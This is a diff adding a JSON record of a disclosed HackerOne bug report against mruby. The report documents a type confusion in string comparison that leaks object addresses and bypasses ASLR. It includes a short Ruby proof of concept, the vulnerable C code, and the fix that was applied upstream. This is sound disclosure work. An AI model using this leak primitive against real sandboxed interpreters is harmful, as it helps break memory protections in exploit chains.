@@ -1,0 +1,339 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-03-14T21:24:39.662Z", 
+    "voters": [
+        "eveeez", 
+        "spetr0x"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "100.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 207321, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-03-14T21:09:12.661Z", 
+    "vulnerability_information": "There are several different places in which arguments are treated as fixnums without a prior check for their type. Since ```mrb_value``` is a union that holds all value types, it can cause a mixup between an object pointer and an integer value:\n```cpp\ntypedef struct mrb_value {\n  union {\n    mrb_float f;\n    void *p;\n    mrb_int i;\n    mrb_sym sym;\n  } value;\n  enum mrb_vtype tt;\n} mrb_value;\n```\n\nPoC Script:\n=======\n```Ruby\nclass Integer\n    def <=>(arg1)\n        return arg1\n    end\nend\n\ns = \"hello\"\ns.<=>(1)\n```\nAnd the output varies between runs (because of ASLR) and between architecture (32/64 bit) and seems like this: ```-69972254725992``` meaning an address of: ```0x3fa3af631768```.\n\nVulnerable Code:\n===========\nThe ```mrb_str_cmp_m``` function (```s.<=>()```) in ```string.c``` uses the ```<=>``` function of the argument, if the argument is not a string. That function can be overridden (like was demonstrated in the PoC), and the returned value is not checked to be a fixnum, while it is treated as a fixnum:\n```cpp\n  mrb_value str2;\n  mrb_int result;\n\n  mrb_get_args(mrb, \"o\", &str2);\n  if (!mrb_string_p(str2)) {\n    if (!mrb_respond_to(mrb, str2, mrb_intern_lit(mrb, \"to_s\"))) {\n      return mrb_nil_value();\n    }\n    else if (!mrb_respond_to(mrb, str2, mrb_intern_lit(mrb, \"<=>\"))) {\n      return mrb_nil_value();\n    }\n    else {\n      mrb_value tmp = mrb_funcall(mrb, str2, \"<=>\", 1, str1);\n\n      if (mrb_nil_p(tmp)) return mrb_nil_value();\n      if (!mrb_fixnum(tmp)) {\n        return mrb_funcall(mrb, mrb_fixnum_value(0), \"-\", 1, tmp);\n      }\n      result = -mrb_fixnum(tmp);\n    }\n  }\n  else {\n    result = mrb_str_cmp(mrb, str1, str2);\n  }\n  return mrb_fixnum_value(result);\n```\nThis means that the PoC code gets ```tmp``` as the original string (since ```1.<=>(str1)``` returns ```str1```), and ```mrb_fixnum(tmp)``` will be the address of the string object. Since it is returned as ```-mrb_fixnum(tmp)``` our value was negative.\n\nMore minor examples:\n------------------------\n1. ```mrb_str_aref_m``` function in ```string.c``` does not check the fixnum's type. can cause only a very minor information-leak over the MSbit (pos < 0).\n2. ```mrb_str_index``` function in ```string.c``` does not check the 2nd arg, but has no security implications.\n3. ```mrb_str_rindex``` function in ```string.c``` does not check the 2nd arg, can again leak the MSbit of the address (again a vpos < 0 check).\n\nSuggested Fix:\n=========\nBefore the argument / returned value is treated as a fixnum, it should be checked to match it in type using the ```mrb_fixnum_p``` macro, or any other chosen way.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "User"
+    }, 
+    "title": "Controlled address leak due to type confusion - ASLR bypass", 
+    "is_member_of_team?": null, 
+    "vote_count": 2, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-04-13T21:09:12.689Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$100", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": true, 
+            "created_at": "2017-02-18T13:26:29.274Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-18T13:26:29.274Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!", 
+            "markdown_message": "<p>Thank you for reporting this bug! This is an automated response to let you know that we&#39;ve received your issue, and we&#39;ll process it as soon as possible.</p>\n\n<p>Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1492959, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-27T21:01:49.090Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-27T21:01:49.090Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Will this report will be handled only after my second report will be closed? It seems a waste that this report received no attention so far...", 
+            "markdown_message": "<p>Will this report will be handled only after my second report will be closed? It seems a waste that this report received no attention so far...</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1509324, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-27T21:05:17.196Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-27T21:05:17.196Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for your report. We have reproduced the issue, and opened an issue upstream: https://github.com/mruby/mruby/issues/3476", 
+            "markdown_message": "<p>Thank you for your report. We have reproduced the issue, and opened an issue upstream: <a title=\"https://github.com/mruby/mruby/issues/3476\" href=\"/redirect?signature=2bace10a9826219e8c69fa48cc1ccfa6ad231374&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3476\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/issues/3476</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1509332, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-27T21:06:41.660Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-27T21:06:41.660Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks for the quick response", 
+            "markdown_message": "<p>Thanks for the quick response</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1509343, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt"
+            }, 
+            "created_at": "2017-03-07T16:07:09.299Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-07T16:07:09.299Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks again for your report. This issue was addressed upstream in the following commits:\n\nhttps://github.com/mruby/mruby/commit/bdac7dfae818908f7459fc086727b717aa586c7d\nhttps://github.com/mruby/mruby/commit/74dbee8e5275e51d92acb26bf04558d67a3edea4\nhttps://github.com/mruby/mruby/commit/405f5a2d2ac39cfb9e294aba420fe70d87f15cb1\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.", 
+            "markdown_message": "<p>Thanks again for your report. This issue was addressed upstream in the following commits:</p>\n\n<p><a title=\"https://github.com/mruby/mruby/commit/bdac7dfae818908f7459fc086727b717aa586c7d\" href=\"/redirect?signature=a8539defaefe9da940386186f556272c274a44c6&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fbdac7dfae818908f7459fc086727b717aa586c7d\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/bdac7dfae818908f7459fc086727b717aa586c7d</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://github.com/mruby/mruby/commit/74dbee8e5275e51d92acb26bf04558d67a3edea4\" href=\"/redirect?signature=12c77af2e6101bab171dfb0c0acd1d58d60520f9&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F74dbee8e5275e51d92acb26bf04558d67a3edea4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/74dbee8e5275e51d92acb26bf04558d67a3edea4</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://github.com/mruby/mruby/commit/405f5a2d2ac39cfb9e294aba420fe70d87f15cb1\" href=\"/redirect?signature=93f0c381bec6a2036671834bbb4ba90cfd02bfc2&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F405f5a2d2ac39cfb9e294aba420fe70d87f15cb1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/405f5a2d2ac39cfb9e294aba420fe70d87f15cb1</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Our next round of bounty decisions will take place within two weeks, so we&#39;ll be in touch with you again soon.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1524535, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-03-14T21:09:06.981Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T21:09:06.981Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "100.0", 
+            "collaborator": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt"
+            }, 
+            "message": "Thanks for helping improve the security of the MRuby project!", 
+            "markdown_message": "<p>Thanks for helping improve the security of the MRuby project!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1541570, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-14T21:09:12.676Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T21:09:12.676Z", 
+            "actor": {
+                "username": "andrewdunbar", 
+                "url": "/andrewdunbar", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1541571, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-14T21:24:39.677Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T21:24:39.677Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks for the reward.", 
+            "markdown_message": "<p>Thanks for the reward.</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1541623, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-14T21:24:39.709Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T21:24:39.709Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1541624, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "aerodudrizzt", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/aerodudrizzt", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/098/646/6dd706f25a4db060df25b01c8609c8f1762533f0_small.png?1483983167"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 18, 
+        "name": "Information Disclosure"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -52018384.51038878, 
+    "disclosed_at": "2017-03-14T21:24:39.696Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/207321", 
+    "created_at": "2017-02-18T13:26:29.063Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>There are several different places in which arguments are treated as fixnums without a prior check for their type. Since <code>mrb_value</code> is a union that holds all value types, it can cause a mixup between an object pointer and an integer value:</p>\n<pre class=\"highlight cpp\"><code><span class=\"k\">typedef</span> <span class=\"k\">struct</span> <span class=\"n\">mrb_value</span> <span class=\"p\">{</span>\n  <span class=\"k\">union</span> <span class=\"p\">{</span>\n    <span class=\"n\">mrb_float</span> <span class=\"n\">f</span><span class=\"p\">;</span>\n    <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">p</span><span class=\"p\">;</span>\n    <span class=\"n\">mrb_int</span> <span class=\"n\">i</span><span class=\"p\">;</span>\n    <span class=\"n\">mrb_sym</span> <span class=\"n\">sym</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span> <span class=\"n\">value</span><span class=\"p\">;</span>\n  <span class=\"k\">enum</span> <span class=\"n\">mrb_vtype</span> <span class=\"n\">tt</span><span class=\"p\">;</span>\n<span class=\"p\">}</span> <span class=\"n\">mrb_value</span><span class=\"p\">;</span>\n</code></pre>\n<h1 id=\"poc-script\">PoC Script:</h1>\n<pre class=\"highlight plaintext\"><code>class Integer\n    def &lt;=&gt;(arg1)\n        return arg1\n    end\nend\n\ns = &quot;hello&quot;\ns.&lt;=&gt;(1)\n</code></pre>\n<p>And the output varies between runs (because of ASLR) and between architecture (32/64 bit) and seems like this: <code>-69972254725992</code> meaning an address of: <code>0x3fa3af631768</code>.</p>\n\n<h1 id=\"vulnerable-code\">Vulnerable Code:</h1>\n\n<p>The <code>mrb_str_cmp_m</code> function (<code>s.&lt;=&gt;()</code>) in <code>string.c</code> uses the <code>&lt;=&gt;</code> function of the argument, if the argument is not a string. That function can be overridden (like was demonstrated in the PoC), and the returned value is not checked to be a fixnum, while it is treated as a fixnum:</p>\n<pre class=\"highlight cpp\"><code>  <span class=\"n\">mrb_value</span> <span class=\"n\">str2</span><span class=\"p\">;</span>\n  <span class=\"n\">mrb_int</span> <span class=\"n\">result</span><span class=\"p\">;</span>\n\n  <span class=\"n\">mrb_get_args</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"s\">&quot;o&quot;</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">str2</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">mrb_string_p</span><span class=\"p\">(</span><span class=\"n\">str2</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">mrb_respond_to</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">str2</span><span class=\"p\">,</span> <span class=\"n\">mrb_intern_lit</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"s\">&quot;to_s&quot;</span><span class=\"p\">)))</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span> <span class=\"n\">mrb_nil_value</span><span class=\"p\">();</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">mrb_respond_to</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">str2</span><span class=\"p\">,</span> <span class=\"n\">mrb_intern_lit</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"s\">&quot;&lt;=&gt;&quot;</span><span class=\"p\">)))</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span> <span class=\"n\">mrb_nil_value</span><span class=\"p\">();</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">else</span> <span class=\"p\">{</span>\n      <span class=\"n\">mrb_value</span> <span class=\"n\">tmp</span> <span class=\"o\">=</span> <span class=\"n\">mrb_funcall</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">str2</span><span class=\"p\">,</span> <span class=\"s\">&quot;&lt;=&gt;&quot;</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"n\">str1</span><span class=\"p\">);</span>\n\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">mrb_nil_p</span><span class=\"p\">(</span><span class=\"n\">tmp</span><span class=\"p\">))</span> <span class=\"k\">return</span> <span class=\"n\">mrb_nil_value</span><span class=\"p\">();</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">mrb_fixnum</span><span class=\"p\">(</span><span class=\"n\">tmp</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">mrb_funcall</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">mrb_fixnum_value</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"s\">&quot;-&quot;</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"n\">tmp</span><span class=\"p\">);</span>\n      <span class=\"p\">}</span>\n      <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"o\">-</span><span class=\"n\">mrb_fixnum</span><span class=\"p\">(</span><span class=\"n\">tmp</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">mrb_str_cmp</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">str1</span><span class=\"p\">,</span> <span class=\"n\">str2</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"n\">mrb_fixnum_value</span><span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">);</span>\n</code></pre>\n<p>This means that the PoC code gets <code>tmp</code> as the original string (since <code>1.&lt;=&gt;(str1)</code> returns <code>str1</code>), and <code>mrb_fixnum(tmp)</code> will be the address of the string object. Since it is returned as <code>-mrb_fixnum(tmp)</code> our value was negative.</p>\n\n<h2 id=\"more-minor-examples\">More minor examples:</h2>\n\n<ol>\n<li>\n<code>mrb_str_aref_m</code> function in <code>string.c</code> does not check the fixnum&#39;s type. can cause only a very minor information-leak over the MSbit (pos &lt; 0).</li>\n<li>\n<code>mrb_str_index</code> function in <code>string.c</code> does not check the 2nd arg, but has no security implications.</li>\n<li>\n<code>mrb_str_rindex</code> function in <code>string.c</code> does not check the 2nd arg, can again leak the MSbit of the address (again a vpos &lt; 0 check).</li>\n</ol>\n\n<h1 id=\"suggested-fix\">Suggested Fix:</h1>\n\n<p>Before the argument / returned value is treated as a fixnum, it should be checked to match it in type using the <code>mrb_fixnum_p</code> macro, or any other chosen way.</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.mruby.science", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "shopify-scripts"
+        }, 
+        "handle": "shopify-scripts", 
+        "url": "https://hackerone.com/shopify-scripts", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15668, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
